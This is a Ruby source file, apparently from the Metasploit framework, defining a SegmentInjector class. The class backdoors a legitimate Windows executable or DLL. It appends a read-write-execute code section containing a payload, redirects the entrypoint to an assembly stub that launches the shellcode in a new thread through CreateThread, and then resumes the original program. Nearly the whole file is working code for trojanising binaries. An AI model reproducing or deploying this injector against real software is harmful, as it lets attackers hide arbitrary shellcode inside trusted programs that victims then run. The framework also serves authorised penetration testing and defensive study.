# -*- coding: binary -*-
module Msf
module Exe

  require 'metasm'

  class SegmentInjector

    attr_accessor :payload
    attr_accessor :template
    attr_accessor :arch
    attr_accessor :buffer_register
    attr_accessor :secname

    def initialize(opts = {})
      @payload = opts[:payload]
      @template = opts[:template]
      @arch  = opts[:arch] || :x86
      @buffer_register = opts[:buffer_register]
      @secname = opts[:secname]
      x86_regs = %w{eax ecx edx ebx edi esi}
      x64_regs = %w{rax rcx rdx rbx rdi rsi} + (8..15).map{|n| "r#{n}" }

      @buffer_register ||= if @arch == :x86
                             "edx"
                           else
                             "rdx"
                           end

      if @arch == :x86 && !x86_regs.include?(@buffer_register.downcase)
        raise ArgumentError, ":buffer_register is not a real register"
      elsif @arch == :x64 && !x64_regs.include?(@buffer_register.downcase)
        raise ArgumentError, ":buffer_register is not a real register"
      end
    end

    def processor
      case @arch
      when :x86
        return Metasm::Ia32.new
      when :x64
        return Metasm::X86_64.new
      else
        raise "Incompatible architecture"
      end
    end

    def create_thread_stub
      case @arch
      when :x86
        create_thread_stub_x86
      when :x64
        create_thread_stub_x64
      else
        raise "Incompatible architecture"
      end
    end

    def create_thread_stub_x64
      <<-EOS
        mov rcx, hook_libname
        sub rsp, 30h
        mov rax, iat_LoadLibraryA
        call [rax]
        add rsp, 30h

        mov rdx, hook_funcname
        mov rcx, rax
        sub rsp, 30h
        mov rax, iat_GetProcAddress
        call [rax]
        add rsp, 30h

        push 0
        push 0
        mov r9, 0
        mov r8, thread_hook
        mov rdx, 0
        mov rcx, 0
        call rax
        add rsp,10h ; clean up the push 0 above

        jmp entrypoint

        hook_libname db 'kernel32', 0
        hook_funcname db 'CreateThread', 0

        thread_hook:
        mov #{buffer_register}, shellcode
        shellcode:
      EOS
    end

    def create_thread_stub_x86
      <<-EOS
        pushad
        push hook_libname
        call [iat_LoadLibraryA]
        push hook_funcname
        push eax
        call [iat_GetProcAddress]
        lea edx, [thread_hook]
        push 0
        push 0
        push 0
        push edx
        push 0
        push 0
        call eax

        popad
        jmp entrypoint

        hook_libname db 'kernel32', 0
        hook_funcname db 'CreateThread', 0

        thread_hook:
        lea #{buffer_register}, [shellcode]
        shellcode:
      EOS
    end

    def payload_stub(prefix)
      asm = "hook_entrypoint:\n#{prefix}\n"
      asm << create_thread_stub

      shellcode = Metasm::Shellcode.assemble(processor, asm)

      shellcode.encoded + @payload
    end

    def is_warbird?(pe)
      # The byte sequence is for the following code pattern:
      # .text:004136B4                 mov     eax, large fs:30h
      # .text:004136BA                 sub     ecx, edx
      # .text:004136BC                 sar     ecx, 1
      # .text:004136BE                 mov     eax, [eax+0Ch]
      # .text:004136C1                 add     eax, 0Ch
      pattern = "\x64\xA1\x30\x00\x00\x00\x2B\xCA\xD1\xF9\x8B\x40\x0C\x83\xC0\x0C"
      section = pe.sections.find { |s| s.name.to_s == '.text' }
      if section.nil?
        return false
      elsif section && section.encoded.pattern_scan(pattern).blank?
        return false
      end

      true
    end

    def generate_pe
      # Copy our Template into a new PE
      pe_orig = Metasm::PE.decode_file(template)
      if is_warbird?(pe_orig)
        raise RuntimeError, "The template to inject to appears to have license verification (warbird)"
      end
      pe = pe_orig.mini_copy

      # Copy the headers and exports
      pe.mz.encoded = pe_orig.encoded[0, pe_orig.coff_offset-4]
      pe.mz.encoded.export = pe_orig.encoded[0, 512].export.dup
      pe.header.time = pe_orig.header.time

      # Don't rebase if we can help it since Metasm doesn't do relocations well
      pe.optheader.dll_characts.delete("DYNAMIC_BASE")

      prefix = dll_prefix(pe)

      # Generate a new code section set to RWX with our payload in it
      s = Metasm::PE::Section.new
      s.name = '.text'
      s.encoded = payload_stub(prefix)
      s.characteristics = %w[MEM_READ MEM_WRITE MEM_EXECUTE]

      # Tell our section where the original entrypoint was
      if pe.optheader.entrypoint != 0
        s.encoded.fixup!('entrypoint' => pe.optheader.image_base + pe.optheader.entrypoint)
      end
      pe.sections << s
      pe.invalidate_header

      # Change the entrypoint to our new section
      pe.optheader.entrypoint = 'hook_entrypoint'
      pe.cpu = pe_orig.cpu

      pe.encode_string
    end

    # @param pe [Metasm::PE]
    # @return [String] assembly code to place at the entrypoint. Will be empty
    #   for non-DLL executables.
    def dll_prefix(pe)
      prefix = ''
      if pe.header.characteristics.include? "DLL"
        # if there is no entry point, just return after we bail or spawn shellcode
        if pe.optheader.entrypoint == 0
          prefix = "cmp [esp + 8], 1
              jz spawncode
entrypoint:
              xor eax, eax
              inc eax
              ret 0x0c
              spawncode:"
        else
          # there is an entry point, we'll need to go to it after we bail or spawn shellcode
          # if fdwReason != DLL_PROCESS_ATTACH, skip the shellcode, jump back to original DllMain
          prefix = "cmp [esp + 8], 1
              jnz entrypoint"
        end
      end

      prefix
    end

  end
end
end
